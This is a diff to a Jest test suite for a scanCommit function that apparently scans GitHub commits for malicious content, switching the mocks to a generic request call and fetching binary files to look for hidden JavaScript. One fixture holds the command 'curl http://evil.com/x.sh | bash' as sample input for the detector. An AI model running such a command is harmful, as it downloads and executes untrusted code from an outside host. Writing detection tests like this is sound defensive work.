@@ -190,22 +190,18 @@ describe("workflow file dual-rule coverage", () => {
 });
 
 describe("scanCommit", () => {
-  let mockOctokit: any;
-  let getContentMock: jest.Mock;
+  let mockOctokit: { request: jest.Mock };
+  let requestMock: jest.Mock;
 
   beforeEach(() => {
-    getContentMock = jest.fn();
+    requestMock = jest.fn();
     mockOctokit = {
-      rest: {
-        repos: {
-          getContent: getContentMock,
-        },
-      },
+      request: requestMock,
     };
   });
 
   it("scans and detects findings in a regular file", async () => {
-    getContentMock.mockResolvedValue({
+    requestMock.mockResolvedValue({
       data: {
         type: "file",
         content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
@@ -213,7 +209,7 @@ describe("scanCommit", () => {
     });
 
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
@@ -226,7 +222,7 @@ describe("scanCommit", () => {
   });
 
   it("scans both file and workflow rules for workflow files", async () => {
-    getContentMock.mockResolvedValue({
+    requestMock.mockResolvedValue({
       data: {
         type: "file",
         content: Buffer.from("uses: some-org/some-action@main").toString("base64"),
@@ -234,7 +230,7 @@ describe("scanCommit", () => {
     });
 
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
@@ -247,8 +243,17 @@ describe("scanCommit", () => {
   });
 
   it("skips binary files", async () => {
+    // Binary files are now fetched to check for hidden JS malware signatures
+    // but return no findings if the content is not JavaScript
+    requestMock.mockResolvedValue({
+      data: {
+        type: "file",
+        content: Buffer.from("PNG fake binary content").toString("base64"),
+      },
+    });
+
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
@@ -257,18 +262,18 @@ describe("scanCommit", () => {
     });
 
     expect(findings).toHaveLength(0);
-    expect(getContentMock).not.toHaveBeenCalled();
+    // Note: requestMock IS called now — binary files are fetched to check
+    // for JS malware hidden inside binary-named files
+    expect(requestMock).toHaveBeenCalledTimes(1);
   });
 
   it("skips non-file items (like directory arrays)", async () => {
-    getContentMock.mockResolvedValue({
-      data: [
-        { name: "file1.txt", type: "file" }
-      ],
+    requestMock.mockResolvedValue({
+      data: [{ name: "file1.txt", type: "file" }],
     });
 
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
@@ -280,10 +285,10 @@ describe("scanCommit", () => {
   });
 
   it("logs a warning and returns no findings when fetching content throws an error", async () => {
-    getContentMock.mockRejectedValue(new Error("API rate limit exceeded"));
+    requestMock.mockRejectedValue(new Error("API rate limit exceeded"));
 
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
@@ -295,10 +300,10 @@ describe("scanCommit", () => {
   });
 
   it("logs a warning with raw string when fetching content throws a non-Error object", async () => {
-    getContentMock.mockRejectedValue("Simulated raw string error");
+    requestMock.mockRejectedValue("Simulated raw string error");
 
     const findings = await scanCommit({
-      octokit: mockOctokit,
+      octokit: mockOctokit as never,
       owner: "owner",
       repo: "repo",
       sha: "sha",
